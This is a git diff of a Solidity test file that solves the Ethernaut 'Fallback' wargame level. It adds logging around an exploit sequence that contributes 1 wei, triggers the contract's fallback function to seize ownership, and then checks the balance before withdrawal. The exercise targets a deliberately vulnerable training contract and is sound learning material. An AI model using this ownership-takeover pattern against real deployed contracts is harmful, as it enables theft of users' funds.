@@ -6,9 +6,9 @@ import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
 contract FallbackTest is DSTest {
-    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Vm vm = Vm(address(HEVM_ADDRESS));
     Ethernaut ethernaut;
-    address eoaAddress = address(100);
+    address eoaAddress = address(1337);
 
     function setUp() public {
         // Setup instance of the Ethernaut contract
@@ -32,14 +32,23 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        emit log_named_address("Player", address(eoaAddress));
+        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
+
         // Contribute 1 wei - verify contract state has been updated
         ethernautFallback.contribute{value: 1 wei}();
+
+        emit log_named_uint("Contribution", ethernautFallback.contributions(eoaAddress));
         assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
+        
+        emit log_named_address("Owner", address(ethernautFallback.owner()));
+        emit log_named_uint("Contribution", ethernautFallback.contributions(eoaAddress));
 
         // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
         payable(address(ethernautFallback)).call{value: 1 wei}("");
         // Verify contract owner has been updated to 0 address
         assertEq(ethernautFallback.owner(), eoaAddress);
+        emit log_named_address("Owner", address(ethernautFallback.owner()));
 
         // Withdraw from contract - Check contract balance before and after
         emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
